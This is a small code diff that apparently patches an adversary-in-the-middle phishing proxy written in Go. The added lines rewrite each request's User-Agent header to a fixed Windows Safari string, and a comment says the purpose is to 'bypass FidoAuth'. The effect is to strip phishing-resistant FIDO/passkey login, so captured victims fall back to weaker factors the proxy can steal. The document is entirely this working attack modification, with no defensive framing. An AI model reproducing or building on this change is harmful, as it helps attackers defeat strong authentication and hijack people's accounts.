@@ -630,6 +630,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
+				// Replace Any User Agent With Windows Safari User Agent to bypass FidoAuth
+				useragent := req.Header.Get("User-Agent")
+				log.Debug("[%d] User Agent : %s", ps.Index, useragent)
+				if useragent != "" {
+						req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Version/18.5 Safari/605.1.15")
+						log.Debug("[%d] Injected User Agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Version/18.5 Safari/605.1.15", ps.Index)
+				}
+
 				// fix referer
 				referer := req.Header.Get("Referer")
 				if referer != "" {
